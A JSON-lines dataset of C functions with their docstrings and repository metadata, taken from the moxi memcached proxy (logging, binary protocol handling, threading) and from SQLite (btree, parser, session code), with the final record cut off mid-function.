{"docstring": "/**\n * open the errorlog\n *\n * if the open failed, report to the user and die\n * if no filename is given, use syslog instead\n */\n", "func_signal": "int log_error_cycle(moxi_log *mlog)", "code": "{\n    /* only cycle if we are not in syslog-mode */\n\n    if (mlog->log_mode == ERRORLOG_FILE) {\n        const char *logfile = mlog->log_file;\n        /* already check of opening time */\n\n        int new_fd;\n\n        log_error_write(mlog, __FILE__, __LINE__, \"About to cycle log \\n\");\n\n        if (-1 == (new_fd = open(logfile, O_APPEND | O_WRONLY | O_CREAT | O_LARGEFILE, 0644))) {\n#ifdef HAVE_SYSLOG_H\n            /* write to old log */\n            log_error_write(mlog, __FILE__, __LINE__,\n                            \"cycling errorlog '%s' failed: %s. failing back to syslog()\",\n                            logfile, strerror(errno));\n\n            mlog->log_mode = ERRORLOG_SYSLOG;\n#else\n            log_error_write(mlog, __FILE__, __LINE__,\n                            \"cycling errorlog '%s' failed: %s. failing back to stderr\",\n                            logfile, strerror(errno));\n\n            mlog->log_mode = ERRORLOG_STDERR;\n#endif\n            close(mlog->fd);\n            mlog->fd = -1;\n\n        } else {\n            /* ok, new log is open, close the old one */\n            close(mlog->fd);\n            mlog->fd = new_fd;\n            log_error_write(mlog, __FILE__, __LINE__, \"Log Cycled \\n\");\n        }\n    }\n\n    return 0;\n}", "path": "log.c", "repo_name": "steveyen/moxi", "stars": 136, "license": "bsd-3-clause", "language": "c", "size": 12776}
{"docstring": "/**\n * open the errorlog\n *\n * we have 3 possibilities:\n * - stderr (default)\n * - syslog\n * - logfile\n *\n * if the open failed, report to the user and die\n */\n", "func_signal": "int log_error_open(moxi_log *mlog)", "code": "{\n    assert(mlog);\n\n    if (!mlog->logbuf) {\n        mlog->logbuf = calloc(1, MAX_LOGBUF_LEN + 1);\n        mlog->logbuf_used = 0;\n    }\n\n    if (mlog->log_mode == ERRORLOG_FILE) {\n        const char *logfile = mlog->log_file;\n\n        if (-1 == (mlog->fd = open(logfile, O_APPEND | O_WRONLY | O_CREAT | O_LARGEFILE, 0644))) {\n#ifdef HAVE_SYSLOG_H\n            fprintf(stderr, \"ERROR: opening errorlog '%s' failed. error: %s, Switching to syslog.\\n\",\n                    logfile, strerror(errno));\n\n            mlog->log_mode = ERRORLOG_SYSLOG;\n#else\n            fprintf(stderr, \"ERROR: opening errorlog '%s' failed. error: %s, Switching to stderr.\\n\",\n                    logfile, strerror(errno));\n            mlog->log_mode = ERRORLOG_STDERR;\n#endif\n        }\n    }\n\n#ifdef HAVE_SYSLOG_H\n    if (mlog->log_mode == ERRORLOG_SYSLOG) {\n        openlog(mlog->log_ident, LOG_CONS | LOG_PID, LOG_DAEMON);\n    }\n#endif\n\n    return 0;\n}", "path": "log.c", "repo_name": "steveyen/moxi", "stars": 136, "license": "bsd-3-clause", "language": "c", "size": 12776}
{"docstring": "/* Called when we receive a binary response header from\n * a downstream server, via try_read_command()/drive_machine().\n */\n", "func_signal": "void cproxy_process_a2b_downstream(conn *c)", "code": "{\n    assert(c != NULL);\n    assert(c->cmd >= 0);\n    assert(c->next == NULL);\n    assert(c->item == NULL);\n    assert(IS_BINARY(c->protocol));\n    assert(IS_PROXY(c->protocol));\n\n    // Snapshot rcurr, because the caller, try_read_command(), changes it.\n    //\n    c->cmd_start = c->rcurr;\n\n    protocol_binary_response_header *header =\n        (protocol_binary_response_header *) &c->binary_header;\n\n    header->response.status = (uint16_t) ntohs(header->response.status);\n\n    assert(header->response.magic == (uint8_t) PROTOCOL_BINARY_RES);\n    assert(header->response.opcode == c->cmd);\n\n    process_bin_noreply(c); // Map quiet c->cmd values into non-quiet.\n\n    int      extlen  = header->response.extlen;\n    int      keylen  = header->response.keylen;\n    uint32_t bodylen = header->response.bodylen;\n\n    assert(bodylen >= (uint32_t) keylen + extlen);\n\n    // Our approach is to read everything we can before\n    // getting into big switch/case statements for the\n    // actual processing.\n    //\n    // If status is non-zero (an err code), then bodylen should be small.\n    // If status is 0, then bodylen might be for a huge item during\n    // a GET family of response.\n    //\n    // If bodylen > extlen + keylen, then we should nread\n    // the ext+key and set ourselves up for a later item nread.\n    //\n    // We overload the meaning of the conn substates...\n    // - bin_reading_get_key means do nread for ext and key data.\n    // - bin_read_set_value means do nread for item data.\n    //\n    if (settings.verbose > 2) {\n        moxi_log_write(\"<%d cproxy_process_a2b_downstream %x %d %d %u\\n\",\n                c->sfd, c->cmd, extlen, keylen, bodylen);\n    }\n\n    if (keylen > 0 || extlen > 0) {\n        // One reason we reach here is during a\n        // GET/GETQ/GETK/GETKQ hit response, because extlen\n        // will be > 0 for the flags.\n        //\n        // Also, we reach here during a GETK miss response, since\n        // keylen will be > 0.  Oddly, a GETK miss response will have\n        // a non-zero status of PROTOCOL_BINARY_RESPONSE_KEY_ENOENT,\n        // but won't have any extra error message string.\n        //\n        // Also, we reach here during a STAT response, with\n        // keylen > 0, extlen == 0, and bodylen == keylen.\n        //\n        assert(c->cmd == PROTOCOL_BINARY_CMD_GET ||\n               c->cmd == PROTOCOL_BINARY_CMD_GETK ||\n               c->cmd == PROTOCOL_BINARY_CMD_STAT);\n\n        bin_read_key(c, bin_reading_get_key, extlen);\n    } else {\n        assert(keylen == 0 && extlen == 0);\n\n        if (bodylen > 0) {\n            // We reach here on error response, version response,\n            // or incr/decr responses, which all have only (relatively\n            // small) body bytes, and with no ext bytes and no key bytes.\n            //\n            // For example, error responses will have 0 keylen,\n            // 0 extlen, with an error message string for the body.\n            //\n            // We'll just reuse the key-reading code path, rather\n            // than allocating an item.\n            //\n            assert(header->response.status != 0 ||\n                   c->cmd == PROTOCOL_BINARY_CMD_VERSION ||\n                   c->cmd == PROTOCOL_BINARY_CMD_INCREMENT ||\n                   c->cmd == PROTOCOL_BINARY_CMD_DECREMENT);\n\n            bin_read_key(c, bin_reading_get_key, bodylen);\n        } else {\n            assert(keylen == 0 && extlen == 0 && bodylen == 0);\n\n            // We have the entire response in the header,\n            // such as due to a general success response,\n            // including a no-op response.\n            //\n            a2b_process_downstream_response(c);\n        }\n    }\n}", "path": "cproxy_protocol_a2b.c", "repo_name": "steveyen/moxi", "stars": 136, "license": "bsd-3-clause", "language": "c", "size": 12776}
{"docstring": "/* An skey is a space prefixed key string.\n */\n", "func_signal": "int a2b_multiget_skey(conn *c, char *skey, int skey_length, int vbucket, int key_index)", "code": "{\n    char *key     = skey + 1;\n    int   key_len = skey_length - 1;\n\n    item *it = item_alloc(\"b\", 1, 0, 0, sizeof(protocol_binary_request_get));\n    if (it != NULL) {\n        if (add_conn_item(c, it)) {\n            protocol_binary_request_getk *req =\n                (protocol_binary_request_getk *) ITEM_data(it);\n\n            memset(req, 0, sizeof(req->bytes));\n\n            req->message.header.request.magic  = PROTOCOL_BINARY_REQ;\n            req->message.header.request.opcode = PROTOCOL_BINARY_CMD_GETKQ;\n            req->message.header.request.keylen = htons((uint16_t) key_len);\n            req->message.header.request.datatype = PROTOCOL_BINARY_RAW_BYTES;\n            req->message.header.request.bodylen  = htonl(key_len);\n            req->message.header.request.opaque   = htonl(key_index);\n\n            if (vbucket >= 0) {\n                req->message.header.request.reserved = htons(vbucket);\n\n                if (settings.verbose > 2) {\n                    char key_buf[KEY_MAX_LENGTH + 10];\n                    assert(key_len <= KEY_MAX_LENGTH);\n                    memcpy(key_buf, key, key_len);\n                    key_buf[key_len] = '\\0';\n\n                    moxi_log_write(\"<%d a2b_multiget_skey '%s' %d %d\\n\",\n                            c->sfd, key_buf, vbucket, key_index);\n                }\n            }\n\n            if (add_iov(c, ITEM_data(it), sizeof(req->bytes)) == 0 &&\n                add_iov(c, key, key_len) == 0) {\n                return 0; // Success.\n            }\n\n            return -1;\n        }\n\n        item_remove(it);\n    }\n\n    return -1;\n}", "path": "cproxy_protocol_a2b.c", "repo_name": "steveyen/moxi", "stars": 136, "license": "bsd-3-clause", "language": "c", "size": 12776}
{"docstring": "/* Invoked when we have read a complete downstream binary response,\n * including header, ext, key, and item data, as appropriate.\n */\n", "func_signal": "void a2b_process_downstream_response(conn *c)", "code": "{\n    assert(c != NULL);\n    assert(c->cmd >= 0);\n    assert(c->next == NULL);\n    assert(c->cmd_start != NULL);\n    assert(IS_BINARY(c->protocol));\n    assert(IS_PROXY(c->protocol));\n\n    protocol_binary_response_header *header =\n        (protocol_binary_response_header *) &c->binary_header;\n\n    uint32_t extlen  = header->response.extlen;\n    uint32_t keylen  = header->response.keylen;\n    uint32_t bodylen = header->response.bodylen;\n    uint16_t status  = header->response.status;\n\n    if (settings.verbose > 2) {\n        moxi_log_write(\"<%d cproxy_process_a2b_downstream_response, cmd: %x, item: %d, status: %d\\n\",\n                c->sfd, c->cmd, (c->item != NULL), status);\n    }\n\n    // We reach here when we have the entire response,\n    // including header, ext, key, and possibly item data.\n    // Now we can get into big switch/case processing.\n    //\n    downstream *d = c->extra;\n    assert(d != NULL);\n    assert(d->ptd != NULL);\n    assert(d->ptd->proxy != NULL);\n\n    item *it = c->item;\n\n    // Clear c->item because we either move it to the upstream or\n    // item_remove() it on error.\n    //\n    c->item = NULL;\n\n    if (cproxy_binary_ignore_reply(c, header, it)) {\n        return;\n    }\n\n    conn *uc = d->upstream_conn;\n\n    // Handle not-my-vbucket error response.\n    //\n    if (status == PROTOCOL_BINARY_RESPONSE_NOT_MY_VBUCKET) {\n        assert(it == NULL);\n\n        if (a2b_not_my_vbucket(uc, c, header)) {\n            return;\n        }\n    }\n\n    switch (c->cmd) {\n    case PROTOCOL_BINARY_CMD_GETK:\n        if (settings.verbose > 2) {\n            moxi_log_write(\"%d: cproxy_process_a2b_downstream_response GETK \"\n                    \"noreply: %d\\n\", c->sfd, c->noreply);\n        }\n\n        if (c->noreply == false) {\n            // Single-key GET/GETS.\n            //\n            if (status == 0) {\n                assert(it != NULL);\n                assert(it->nbytes >= 2);\n                assert(keylen > 0);\n                assert(extlen > 0);\n\n                if (bodylen >= keylen + extlen) {\n                    *(ITEM_data(it) + it->nbytes - 2) = '\\r';\n                    *(ITEM_data(it) + it->nbytes - 1) = '\\n';\n\n                    multiget_ascii_downstream_response(d, it);\n                } else {\n                    assert(false); // TODO.\n                }\n\n                item_remove(it);\n            }\n\n            conn_set_state(c, conn_pause);\n\n            cproxy_update_event_write(d, uc);\n\n            return;\n        }\n\n        // Multi-key GET/GETS.\n        //\n        // We should keep processing for a non-quiet\n        // terminating response (NO-OP).\n        //\n        conn_set_state(c, conn_new_cmd);\n\n        if (status != 0) {\n            assert(it == NULL);\n\n            if (status == PROTOCOL_BINARY_RESPONSE_KEY_ENOENT) {\n                return; // Swallow miss response.\n            }\n\n            // TODO: Handle error case.  Should we pause the conn\n            //       or keep looking for more responses?\n            //\n            assert(false);\n            return;\n        }\n\n        assert(status == 0);\n        assert(it != NULL);\n        assert(it->nbytes >= 2);\n        assert(keylen > 0);\n        assert(extlen > 0);\n\n        if (bodylen >= keylen + extlen) {\n            *(ITEM_data(it) + it->nbytes - 2) = '\\r';\n            *(ITEM_data(it) + it->nbytes - 1) = '\\n';\n\n            multiget_ascii_downstream_response(d, it);\n        } else {\n            assert(false); // TODO.\n        }\n\n        item_remove(it);\n        break;\n\n    case PROTOCOL_BINARY_CMD_FLUSH:\n        conn_set_state(c, conn_pause);\n\n        // TODO: Handle flush_all's expiration parameter against\n        // the front_cache.\n        //\n        // TODO: We flush the front_cache too often, inefficiently\n        // on every downstream FLUSH response, rather than on\n        // just the last FLUSH response.\n        //\n        if (uc != NULL) {\n            mcache_flush_all(&d->ptd->proxy->front_cache, 0);\n        }\n        break;\n\n    case PROTOCOL_BINARY_CMD_NOOP:\n        conn_set_state(c, conn_pause);\n        break;\n\n    case PROTOCOL_BINARY_CMD_SET: /* FALLTHROUGH */\n    case PROTOCOL_BINARY_CMD_ADD:\n    case PROTOCOL_BINARY_CMD_REPLACE:\n    case PROTOCOL_BINARY_CMD_APPEND:\n    case PROTOCOL_BINARY_CMD_PREPEND:\n        conn_set_state(c, conn_pause);\n\n        if (uc != NULL) {\n            assert(uc->next == NULL);\n\n            switch (status) {\n            case PROTOCOL_BINARY_RESPONSE_SUCCESS:\n                out_string(uc, \"STORED\");\n                break;\n            case PROTOCOL_BINARY_RESPONSE_KEY_EEXISTS:\n                if (c->cmd == PROTOCOL_BINARY_CMD_ADD) {\n                    out_string(uc, \"NOT_STORED\");\n                } else {\n                    out_string(uc, \"EXISTS\");\n                }\n                break;\n            case PROTOCOL_BINARY_RESPONSE_KEY_ENOENT:\n                if (c->cmd == PROTOCOL_BINARY_CMD_REPLACE) {\n                    out_string(uc, \"NOT_STORED\");\n                } else {\n                    out_string(uc, \"NOT_FOUND\");\n                }\n                break;\n            default:\n                a2b_out_error(uc, status);\n                break;\n            }\n\n            cproxy_del_front_cache_key_ascii(d, uc->cmd_start);\n\n            cproxy_update_event_write(d, uc);\n        }\n        break;\n\n    case PROTOCOL_BINARY_CMD_DELETE:\n        conn_set_state(c, conn_pause);\n\n        if (uc != NULL) {\n            assert(uc->next == NULL);\n\n            switch (status) {\n            case 0:\n                out_string(uc, \"DELETED\");\n                break;\n            case PROTOCOL_BINARY_RESPONSE_KEY_EEXISTS:\n                out_string(uc, \"EXISTS\");\n                break;\n            case PROTOCOL_BINARY_RESPONSE_KEY_ENOENT:\n            case PROTOCOL_BINARY_RESPONSE_NOT_STORED:\n            case PROTOCOL_BINARY_RESPONSE_ENOMEM: // TODO.\n            default:\n                out_string(uc, \"NOT_FOUND\");\n                break;\n            }\n\n            cproxy_del_front_cache_key_ascii(d, uc->cmd_start);\n\n            cproxy_update_event_write(d, uc);\n        }\n        break;\n\n    case PROTOCOL_BINARY_CMD_INCREMENT: /* FALLTHROUGH */\n    case PROTOCOL_BINARY_CMD_DECREMENT:\n        conn_set_state(c, conn_pause);\n\n        if (uc != NULL) {\n            assert(uc->next == NULL);\n\n            // TODO: Any weird alignment/padding issues on different\n            //       platforms in this cast to worry about here?\n            //\n            protocol_binary_response_incr *response_incr =\n                (protocol_binary_response_incr *) c->cmd_start;\n\n            switch (status) {\n            case 0: {\n                char *s = add_conn_suffix(uc);\n                if (s != NULL) {\n                    uint64_t v = mc_swap64(response_incr->message.body.value);\n                    sprintf(s, \"%llu\", (unsigned long long) v);\n                    out_string(uc, s);\n                } else {\n                    d->ptd->stats.stats.err_oom++;\n                    cproxy_close_conn(uc);\n                }\n                break;\n            }\n            case PROTOCOL_BINARY_RESPONSE_KEY_EEXISTS: // Due to CAS.\n                out_string(uc, \"EXISTS\");\n                break;\n            case PROTOCOL_BINARY_RESPONSE_KEY_ENOENT:\n                out_string(uc, \"NOT_FOUND\");\n                break;\n            case PROTOCOL_BINARY_RESPONSE_NOT_STORED:\n                out_string(uc, \"NOT_STORED\");\n                break;\n            case PROTOCOL_BINARY_RESPONSE_ENOMEM: // TODO.\n            default:\n                out_string(uc, \"SERVER_ERROR a2b arith error\");\n                break;\n            }\n\n            cproxy_del_front_cache_key_ascii(d, uc->cmd_start);\n\n            cproxy_update_event_write(d, uc);\n        }\n        break;\n\n    case PROTOCOL_BINARY_CMD_VERSION:\n        conn_set_state(c, conn_pause);\n\n        if (uc != NULL) {\n            assert(uc->next == NULL);\n\n            if (header->response.status == 0 &&\n                header->response.keylen == 0 &&\n                header->response.extlen == 0 &&\n                header->response.bodylen > 0) {\n                char *s = add_conn_suffix(uc);\n                if (s != NULL) {\n                    // TODO: Assuming bodylen is not that long.\n                    memcpy(s, \"VERSION \", 8);\n                    memcpy(s + 8,\n                           c->cmd_start + sizeof(protocol_binary_response_version),\n                           header->response.bodylen);\n                    s[8 + header->response.bodylen] = '\\0';\n                    out_string(uc, s);\n                } else {\n                    d->ptd->stats.stats.err_oom++;\n                    cproxy_close_conn(uc);\n                }\n            } else {\n                out_string(uc, \"SERVER_ERROR\");\n            }\n\n            cproxy_update_event_write(d, uc);\n        }\n        break;\n\n    case PROTOCOL_BINARY_CMD_STAT:\n        assert(c->noreply == false);\n\n        if (keylen > 0) {\n            assert(it != NULL); // Holds the stat value.\n            assert(it->nbytes > 2);\n            assert(bodylen > keylen);\n            assert(d->merger != NULL);\n\n            if (uc != NULL) {\n                assert(uc->next == NULL);\n\n                // TODO: Handle ITEM and PREFIX.\n                //\n                protocol_stats_merge_name_val(d->merger,\n                                              \"STAT\", 4,\n                                              ITEM_key(it), it->nkey,\n                                              ITEM_data(it), it->nbytes - 2);\n            }\n\n            item_remove(it);\n            conn_set_state(c, conn_new_cmd);\n        } else {\n            // Handle the stats terminator.\n            //\n            assert(it == NULL);\n            assert(bodylen == 0);\n            conn_set_state(c, conn_pause);\n        }\n        break;\n\n    case PROTOCOL_BINARY_CMD_QUIT:\n    default:\n        assert(false); // TODO: Handled unexpected responses.\n        break;\n    }\n}", "path": "cproxy_protocol_a2b.c", "repo_name": "steveyen/moxi", "stars": 136, "license": "bsd-3-clause", "language": "c", "size": 12776}
{"docstring": "/*\n * Processes an incoming \"handle a new connection\" item. This is called when\n * input arrives on the libevent wakeup pipe.\n */\n", "func_signal": "static void thread_libevent_process(int fd, short which, void *arg)", "code": "{\n    LIBEVENT_THREAD *me = arg;\n    CQ_ITEM *cq_item;\n    char buf[1];\n\n    (void)which;\n\n    if (read(fd, buf, 1) != 1)\n        if (settings.verbose > 0)\n            moxi_log_write(\"Can't read from libevent pipe\\n\");\n\n    cq_item = cq_pop(me->new_conn_queue);\n\n    if (NULL != cq_item) {\n        conn *c = conn_new(cq_item->sfd, cq_item->init_state, cq_item->event_flags,\n                           cq_item->read_buffer_size,\n                           cq_item->transport,\n                           me->base,\n                           cq_item->funcs, cq_item->extra);\n        if (c == NULL) {\n            if (IS_UDP(cq_item->transport)) {\n                moxi_log_write(\"Can't listen for events on UDP socket\\n\");\n                exit(1);\n            } else {\n                if (settings.verbose > 0) {\n                    moxi_log_write(\"Can't listen for events on fd %d\\n\",\n                        cq_item->sfd);\n                }\n                close(cq_item->sfd);\n            }\n        } else {\n            c->protocol = cq_item->protocol;\n            c->thread = me;\n        }\n        cqi_free(cq_item);\n    }\n}", "path": "thread.c", "repo_name": "steveyen/moxi", "stars": 136, "license": "bsd-3-clause", "language": "c", "size": 12776}
{"docstring": "/* Used for broadcast commands, like flush_all or stats.\n */\n", "func_signal": "bool cproxy_broadcast_a2b_downstream(downstream *d,\n                                     protocol_binary_request_header *req,\n                                     int req_size,\n                                     uint8_t *key,\n                                     uint16_t keylen,\n                                     uint8_t  extlen,\n                                     conn *uc,\n                                     char *suffix)", "code": "{\n    assert(d != NULL);\n    assert(d->ptd != NULL);\n    assert(d->ptd->proxy != NULL);\n    assert(d->downstream_conns != NULL);\n    assert(d->downstream_used_start == 0);\n    assert(d->downstream_used == 0);\n    assert(req != NULL);\n    assert(req_size >= (int) sizeof(req));\n    assert(req->request.bodylen == 0);\n    assert(uc != NULL);\n    assert(uc->next == NULL);\n    assert(uc->item == NULL);\n\n    req->request.bodylen = htonl(keylen + extlen);\n\n    int nwrite = 0;\n    int nconns = mcs_server_count(&d->mst);\n\n    for (int i = 0; i < nconns; i++) {\n        conn *c = d->downstream_conns[i];\n        if (c != NULL &&\n            c != NULL_CONN) {\n            if (cproxy_prep_conn_for_write(c)) {\n                assert(c->state == conn_pause);\n                assert(c->wbuf);\n                assert(c->wsize >= req_size);\n\n                memcpy(c->wbuf, req, req_size);\n\n                add_iov(c, c->wbuf, req_size);\n\n                if (key != NULL &&\n                    keylen > 0) {\n                    add_iov(c, key, keylen);\n                }\n\n                conn_set_state(c, conn_mwrite);\n                c->write_and_go = conn_new_cmd;\n\n                if (update_event(c, EV_WRITE | EV_PERSIST)) {\n                    nwrite++;\n\n                    if (uc->noreply) {\n                        c->write_and_go = conn_pause;\n                    }\n                } else {\n                    if (settings.verbose > 1) {\n                        moxi_log_write(\"ERROR: Update cproxy write event failed\\n\");\n                    }\n\n                    d->ptd->stats.stats.err_oom++;\n                    cproxy_close_conn(c);\n                }\n            } else {\n                if (settings.verbose > 1) {\n                    moxi_log_write(\"ERROR: a2b broadcast prep conn failed\\n\");\n                }\n\n                d->ptd->stats.stats.err_downstream_write_prep++;\n                cproxy_close_conn(c);\n            }\n        }\n    }\n\n    if (settings.verbose > 2) {\n        moxi_log_write(\"%d: a2b broadcast nwrite %d out of %d\\n\",\n                uc->sfd, nwrite, nconns);\n    }\n\n    if (nwrite > 0) {\n        d->downstream_used_start = nwrite;\n        d->downstream_used       = nwrite;\n\n        if (cproxy_dettach_if_noreply(d, uc) == false) {\n            d->upstream_suffix = suffix;\n            d->upstream_suffix_len = 0;\n            d->upstream_retry = 0;\n\n            cproxy_start_downstream_timeout(d, NULL);\n        } else {\n            // TODO: Handle flush_all's expiration parameter against\n            // the front_cache.\n            //\n            if (req->request.opcode == PROTOCOL_BINARY_CMD_FLUSH ||\n                req->request.opcode == PROTOCOL_BINARY_CMD_FLUSHQ) {\n                mcache_flush_all(&d->ptd->proxy->front_cache, 0);\n            }\n        }\n\n        return true;\n    }\n\n    return false;\n}", "path": "cproxy_protocol_a2b.c", "repo_name": "steveyen/moxi", "stars": 136, "license": "bsd-3-clause", "language": "c", "size": 12776}
{"docstring": "/*\n * Unlinks an item from the LRU and hashtable.\n */\n", "func_signal": "void item_unlink(item *cq_item)", "code": "{\n    pthread_mutex_lock(&cache_lock);\n    do_item_unlink(cq_item);\n    pthread_mutex_unlock(&cache_lock);\n}", "path": "thread.c", "repo_name": "steveyen/moxi", "stars": 136, "license": "bsd-3-clause", "language": "c", "size": 12776}
{"docstring": "/*\n * Worker thread: main event loop\n */\n", "func_signal": "static void *worker_libevent(void *arg)", "code": "{\n    LIBEVENT_THREAD *me = arg;\n\n    /* Any per-thread setup can happen here; thread_init() will block until\n     * all threads have finished initializing.\n     */\n    me->thread_id = pthread_self();\n#ifndef WIN32\n    if (settings.verbose > 1)\n        moxi_log_write(\"worker_libevent thread_id %ld\\n\", (long)me->thread_id);\n#endif\n\n    pthread_mutex_lock(&init_lock);\n    init_count++;\n    pthread_cond_signal(&init_cond);\n    pthread_mutex_unlock(&init_lock);\n\n    event_base_loop(me->base, 0);\n    return NULL;\n}", "path": "thread.c", "repo_name": "steveyen/moxi", "stars": 136, "license": "bsd-3-clause", "language": "c", "size": 12776}
{"docstring": "/*\n * Adds an item to a connection queue.\n */\n", "func_signal": "static void cq_push(CQ *cq, CQ_ITEM *cq_item)", "code": "{\n    cq_item->next = NULL;\n\n    pthread_mutex_lock(&cq->lock);\n    if (NULL == cq->tail)\n        cq->head = cq_item;\n    else\n        cq->tail->next = cq_item;\n    cq->tail = cq_item;\n    pthread_cond_signal(&cq->cond);\n    pthread_mutex_unlock(&cq->lock);\n}", "path": "thread.c", "repo_name": "steveyen/moxi", "stars": 136, "license": "bsd-3-clause", "language": "c", "size": 12776}
{"docstring": "/*\n * Allocates a new item.\n */\n", "func_signal": "item *item_alloc(char *key, size_t nkey, int flags, rel_time_t exptime, int nbytes)", "code": "{\n#ifdef MOXI_ITEM_MALLOC\n    // Skip past the lock, since we're using malloc.\n    return do_item_alloc(key, nkey, flags, exptime, nbytes);\n#else\n    item *it;\n    pthread_mutex_lock(&cache_lock);\n    it = do_item_alloc(key, nkey, flags, exptime, nbytes);\n    pthread_mutex_unlock(&cache_lock);\n    return it;\n#endif\n}", "path": "thread.c", "repo_name": "steveyen/moxi", "stars": 136, "license": "bsd-3-clause", "language": "c", "size": 12776}
{"docstring": "/*\n * Dumps a list of objects of each size in 32-byte increments\n */\n", "func_signal": "void  item_stats_sizes(ADD_STAT add_stats, void *c)", "code": "{\n    pthread_mutex_lock(&cache_lock);\n    do_item_stats_sizes(add_stats, c);\n    pthread_mutex_unlock(&cache_lock);\n}", "path": "thread.c", "repo_name": "steveyen/moxi", "stars": 136, "license": "bsd-3-clause", "language": "c", "size": 12776}
{"docstring": "/*\n * Dumps statistics about slab classes\n */\n", "func_signal": "void  item_stats(ADD_STAT add_stats, void *c)", "code": "{\n    pthread_mutex_lock(&cache_lock);\n    do_item_stats(add_stats, c);\n    pthread_mutex_unlock(&cache_lock);\n}", "path": "thread.c", "repo_name": "steveyen/moxi", "stars": 136, "license": "bsd-3-clause", "language": "c", "size": 12776}
{"docstring": "// ----------------------------------------------------------------------\n", "func_signal": "void mcs_server_st_quit(mcs_server_st *ptr, uint8_t io_death)", "code": "{\n    (void) io_death;\n\n    // TODO: Should send QUIT cmd.\n    //\n    if (ptr->fd != -1) {\n        close(ptr->fd);\n    }\n    ptr->fd = -1;\n}", "path": "mcs.c", "repo_name": "steveyen/moxi", "stars": 136, "license": "bsd-3-clause", "language": "c", "size": 12776}
{"docstring": "/*\n** Free an sqlite3_value object\n*/\n", "func_signal": "SQLITE_PRIVATE void sqlite3ValueFree(sqlite3_value *v)", "code": "{\n  if( !v ) return;\n  sqlite3VdbeMemRelease((Mem *)v);\n  sqlite3DbFree(((Mem*)v)->db, v);\n}", "path": "sqlite3.c", "repo_name": "riolet/longs", "stars": 185, "license": "gpl-2.0", "language": "c", "size": 2013}
{"docstring": "/*\n** Remove the i-th cell from pPage.  This routine effects pPage only.\n** The cell content is not freed or deallocated.  It is assumed that\n** the cell content has been copied someplace else.  This routine just\n** removes the reference to the cell from pPage.\n**\n** \"sz\" must be the number of bytes in the cell.\n*/\n", "func_signal": "static void dropCell(MemPage *pPage, int idx, int sz, int *pRC)", "code": "{\n  u32 pc;         /* Offset to cell content of cell being deleted */\n  u8 *data;       /* pPage->aData */\n  u8 *ptr;        /* Used to move bytes around within data[] */\n  int rc;         /* The return code */\n  int hdr;        /* Beginning of the header.  0 most pages.  100 page 1 */\n\n  if( *pRC ) return;\n\n  assert( idx>=0 && idx<pPage->nCell );\n  assert( CORRUPT_DB || sz==cellSize(pPage, idx) );\n  assert( sqlite3PagerIswriteable(pPage->pDbPage) );\n  assert( sqlite3_mutex_held(pPage->pBt->mutex) );\n  data = pPage->aData;\n  ptr = &pPage->aCellIdx[2*idx];\n  pc = get2byte(ptr);\n  hdr = pPage->hdrOffset;\n  testcase( pc==get2byte(&data[hdr+5]) );\n  testcase( pc+sz==pPage->pBt->usableSize );\n  if( pc < (u32)get2byte(&data[hdr+5]) || pc+sz > pPage->pBt->usableSize ){\n    *pRC = SQLITE_CORRUPT_BKPT;\n    return;\n  }\n  rc = freeSpace(pPage, pc, sz);\n  if( rc ){\n    *pRC = rc;\n    return;\n  }\n  pPage->nCell--;\n  if( pPage->nCell==0 ){\n    memset(&data[hdr+1], 0, 4);\n    data[hdr+7] = 0;\n    put2byte(&data[hdr+5], pPage->pBt->usableSize);\n    pPage->nFree = pPage->pBt->usableSize - pPage->hdrOffset\n                       - pPage->childPtrSize - 8;\n  }else{\n    memmove(ptr, ptr+2, 2*(pPage->nCell - idx));\n    put2byte(&data[hdr+3], pPage->nCell);\n    pPage->nFree += 2;\n  }\n}", "path": "sqlite3.c", "repo_name": "riolet/longs", "stars": 185, "license": "gpl-2.0", "language": "c", "size": 2013}
{"docstring": "/*\n** The following routine is called if the stack overflows.\n*/\n", "func_signal": "static void yyStackOverflow(yyParser *yypParser)", "code": "{\n   sqlite3ParserARG_FETCH;\n   yypParser->yytos--;\n#ifndef NDEBUG\n   if( yyTraceFILE ){\n     fprintf(yyTraceFILE,\"%sStack Overflow!\\n\",yyTracePrompt);\n   }\n#endif\n   while( yypParser->yytos>yypParser->yystack ) yy_pop_parser_stack(yypParser);\n   /* Here code is inserted which will execute if the parser\n   ** stack every overflows */\n/******** Begin %stack_overflow code ******************************************/\n\n  sqlite3ErrorMsg(pParse, \"parser stack overflow\");\n/******** End %stack_overflow code ********************************************/\n   sqlite3ParserARG_STORE; /* Suppress warning about unused %extra_argument var */\n}", "path": "sqlite3.c", "repo_name": "riolet/longs", "stars": 185, "license": "gpl-2.0", "language": "c", "size": 2013}
{"docstring": "/*\n** Enable or disable the session object passed as the first argument.\n*/\n", "func_signal": "SQLITE_API int SQLITE_STDCALL sqlite3session_indirect(sqlite3_session *pSession, int bIndirect)", "code": "{\n  int ret;\n  sqlite3_mutex_enter(sqlite3_db_mutex(pSession->db));\n  if( bIndirect>=0 ){\n    pSession->bIndirect = bIndirect;\n  }\n  ret = pSession->bIndirect;\n  sqlite3_mutex_leave(sqlite3_db_mutex(pSession->db));\n  return ret;\n}", "path": "sqlite3.c", "repo_name": "riolet/longs", "stars": 185, "license": "gpl-2.0", "language": "c", "size": 2013}
{"docstring": "/*\n** The following routines are implementations of the MemPage.xCellSize\n** method.\n**\n** Compute the total number of bytes that a Cell needs in the cell\n** data area of the btree-page.  The return number includes the cell\n** data header and the local payload, but not any overflow page or\n** the space used by the cell pointer.\n**\n** cellSizePtrNoPayload()    =>   table internal nodes\n** cellSizePtr()             =>   all index nodes & table leaf nodes\n*/\n", "func_signal": "static u16 cellSizePtr(MemPage *pPage, u8 *pCell)", "code": "{\n  u8 *pIter = pCell + pPage->childPtrSize; /* For looping over bytes of pCell */\n  u8 *pEnd;                                /* End mark for a varint */\n  u32 nSize;                               /* Size value to return */\n\n#ifdef SQLITE_DEBUG\n  /* The value returned by this function should always be the same as\n  ** the (CellInfo.nSize) value found by doing a full parse of the\n  ** cell. If SQLITE_DEBUG is defined, an assert() at the bottom of\n  ** this function verifies that this invariant is not violated. */\n  CellInfo debuginfo;\n  pPage->xParseCell(pPage, pCell, &debuginfo);\n#endif\n\n  nSize = *pIter;\n  if( nSize>=0x80 ){\n    pEnd = &pIter[8];\n    nSize &= 0x7f;\n    do{\n      nSize = (nSize<<7) | (*++pIter & 0x7f);\n    }while( *(pIter)>=0x80 && pIter<pEnd );\n  }\n  pIter++;\n  if( pPage->intKey ){\n    /* pIter now points at the 64-bit integer key value, a variable length \n    ** integer. The following block moves pIter to point at the first byte\n    ** past the end of the key value. */\n    pEnd = &pIter[9];\n    while( (*pIter++)&0x80 && pIter<pEnd );\n  }\n 